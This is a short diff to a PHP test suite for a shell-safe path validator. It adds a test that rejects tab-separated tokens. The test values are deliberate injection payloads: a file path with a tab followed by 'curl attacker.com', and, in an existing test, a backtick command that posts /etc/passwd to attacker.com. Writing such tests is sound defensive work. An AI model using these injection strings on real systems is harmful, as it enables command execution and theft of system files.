@@ -78,6 +78,13 @@ test('blocks newline command separator', function () {
         ->toThrow(Exception::class, 'newline');
 });
 
+test('blocks tab character as token separator', function () {
+    $path = "/tmp/file\tcurl attacker.com";
+
+    expect(fn () => validateShellSafePath($path, 'test'))
+        ->toThrow(Exception::class, 'tab');
+});
+
 test('blocks complex command injection with the example from issue', function () {
     $path = '/tmp/pwn`curl https://attacker.com -X POST --data "$(cat /etc/passwd)"`';
 
